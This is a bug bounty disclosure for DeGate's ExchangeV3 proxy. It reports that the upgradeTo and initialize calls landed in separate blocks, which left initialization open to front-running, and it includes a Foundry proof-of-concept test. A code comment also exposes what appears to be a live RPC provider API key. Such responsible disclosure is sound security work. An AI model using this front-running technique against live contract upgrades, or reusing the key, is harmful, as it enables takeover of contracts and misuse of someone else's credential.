# 26073 - \[SC - Insight] The implementation upgrade must be done by call...

Submitted on Nov 24th 2023 at 04:30:05 UTC by @Paludo0x for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26073

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x9C07A72177c5A05410cA338823e790876E79D73B#code>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value
* Impact caused by the unintended functionality of multisig owners

## Description

## Bug Description

The implementation upgrade in the ExchangeV3 proxy was performed by sequentially calling:

1. `upgradeTo` function of the proxy <https://dashboard.tenderly.co/tx/mainnet/0x618d6d6bdaa4be3257aa4c695f9c10806e261f0e9759fc3133a5798fed43c062?trace=0>
2. `initialize` function of the implementation <https://dashboard.tenderly.co/tx/mainnet/0x3c5629d35e75eb6b1e3e17e73ea16f3638c46a120a1f31bb8988f9db89bf483a?trace=0>
3. `transferOwnership` function of the implementation <https://dashboard.tenderly.co/tx/mainnet/0x9e6c119e7acaa30e62ef7bc12096dc6bd74ea38b1341aa2ecaeb9092c1e37a01?trace=0>
4. `claimOwnership` function of the implementation <https://dashboard.tenderly.co/tx/mainnet/0x238ba9b1141f396446013989c947851eba3629e81121347f6d66f167f8823469?trace=0.2.1>

The issue is that `upgradeTo` and `initialize` calls have been done at different blocks (respectively 18552107 and 18552108). That imply that **anyone** could have front run the initialize call because it is done throug fallback function of proxy contract which is permissionless.

Function initialize is the following:

```
    function initialize(
        address _loopring,
        address _owner,
        bytes32 _genesisMerkleRoot,
        bytes32 _genesisMerkleAssetRoot
        )
        external
        override
        nonReentrant
        onlyWhenUninitialized
    {
        require(address(0) != _owner, "ZERO_ADDRESS");
        owner = _owner;

        state.initializeGenesisBlock(
            _loopring,
            _genesisMerkleRoot,
            _genesisMerkleAssetRoot,
            EIP712.hash(EIP712.Domain("DeGate Protocol", version(), address(this)))
        );
    }
```

So, the initialize function initializes:

1. the owner of the implementation (not of the proxy, which is stored in a different slot)
2. the loopring address
3. genesisMerkleRoot
4. genesisMerkleAssetRoot

We must consider that the upgrade function is called when the implementation is initialized for the first time or when the implementation is updated to a new version. In the last case it should be called by the multisig and the timelock after at least 45 days. Therefore, resolving the issue could take a long time and a revert of the transaction could be unnoticed.

## Impact

What could be the effects of initialization by any user?

If a malicious user set up a different owner, fortunately, this can be changed by the proxy owner but at later time if the proxy owner is the Timelock.

At the moment, I canno comment the effects of initializing with counterfeit genesisMerkleRoot and genesisMerkleAssetRoot.

Eventually, in my opinion, the biggest problem is Loopring address. A malicious user could deploy a fake Loopring contract similar to the real one but with a backdoor usable by the malicious user himself. While the other initialization parameters (owner and merkle roots) would be the equivalent to the ones of the legitimate transsaction. This situation could be unnoticed by legitimate owners.

## Proof of concept

The POC verifies that any user can call initialize the function after upgrading of implementation and if the same function is called by the owner afterwards it reverts because already initialized. It shall be run with foundry with the following command forge test --match-test test\_initialize\_frontRun --fork-url YOUR\_RPC\_URL --fork-block-number 18552107

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.2 <0.9.0;
pragma abicoder v2;

import {Test, console2} from "forge-std/Test.sol";
import {OwnedUpgradabilityProxy} from "../contracts/thirdparty/proxies/OwnedUpgradabilityProxy.sol";  
import {LoopringIOExchangeOwner} from "../contracts/aux/access/LoopringIOExchangeOwner.sol";  
import {ExchangeV3} from "../contracts/core/impl/ExchangeV3.sol";  
import {ILoopringV3} from "../contracts/core/impl/ExchangeV3.sol";  

interface IMultiSigWallet {
        function removeOwner(address owner) external;
        function addOwner(address owner) external;
}
contract TestPlaygorund is Test {

    address constant contractsDeployer = 0xacD3A62F3eED1BfE4fF0eC8240d645c1F5477F82;
    OwnedUpgradabilityProxy constant excV3ProxyInterfDeployed = OwnedUpgradabilityProxy(0x9C07A72177c5A05410cA338823e790876E79D73B);
    ExchangeV3 constant excV3ProxyImplDeployed = ExchangeV3(0x9C07A72177c5A05410cA338823e790876E79D73B);
    address constant anyUser = address(0xbee);


    //forge test --match-test test_initialize_frontRun --fork-url https://eth-mainnet.g.alchemy.com/v2/gSyV-SZAsIZGOyq7gTEOclsvkFL3dJ94 --fork-block-number 18552107
    function test_initialize_frontRun() public {
    
        //on block 18552107 deployer account (which is actual Proxy Owner) updates implementation address to 
        //https://dashboard.tenderly.co/tx/mainnet/0x618d6d6bdaa4be3257aa4c695f9c10806e261f0e9759fc3133a5798fed43c062

        //we fork from block 18552108, i.e. when function "initialize" is triggered
        address loopring =0x9385aCd9d78dFE854c543294770d0C94c2B07EDC;
        address owner = contractsDeployer;
        bytes32 genesisMerkleRoot = 0x03e1788bf14436c39a3841ae888ffb3e6ec8405bc2773afa28b6d4dfc309cf19;
        bytes32 genesisMerkleAssetRoot = 0x071c8b14d71d432750479f5fe6e08abe1ec04712835a83cdf84d0483b9382ae8;

   
        //I would have loved to check the different loopring value but I'm getting stack too deep error
        //(,,ILoopringV3 tempLoopring,,,,,,,,,,) = excV3ProxyImplDeployed.state();
        
        //we verify that owner is unitialized
        console2.log("Owner address before initialize", excV3ProxyImplDeployed.owner() );

        //any user frontruns and call initialize, he could have changed parameters as he like
        vm.startPrank(anyUser);
        excV3ProxyImplDeployed.initialize(loopring, owner, genesisMerkleRoot, genesisMerkleAssetRoot);
        vm.stopPrank();
        console2.log("Owner address after initialize", excV3ProxyImplDeployed.owner() );

        //try to call initialize function by owner
        vm.startPrank(owner);
        vm.expectRevert("INITIALIZED");
        excV3ProxyImplDeployed.initialize(loopring, owner, genesisMerkleRoot, genesisMerkleAssetRoot);
        vm.stopPrank();
    }
}

```
